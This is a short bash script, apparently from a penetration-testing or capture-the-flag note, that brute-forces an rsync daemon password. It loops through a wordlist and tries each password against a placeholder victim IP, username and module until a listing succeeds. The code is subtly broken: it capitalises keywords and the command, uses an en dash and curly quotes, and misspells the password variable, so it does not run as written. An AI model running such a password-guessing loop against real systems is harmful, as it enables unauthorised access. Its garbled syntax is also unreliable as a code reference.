For pass in $(cat wordlists.txt);
Do
  export RSYNC_PSSWORD=$pass
  Rsync –q rsync://<username_from_etc_passwd>@<victim_ip>:<port>/<home_directory_from_rsyncd.conf> --list-only 2>/dev/null

if [[ $? -eq 0 ]]
then 
    echo “Valid password: $pass”
    break
fi
echo “Wrong password: $pass”
 
done
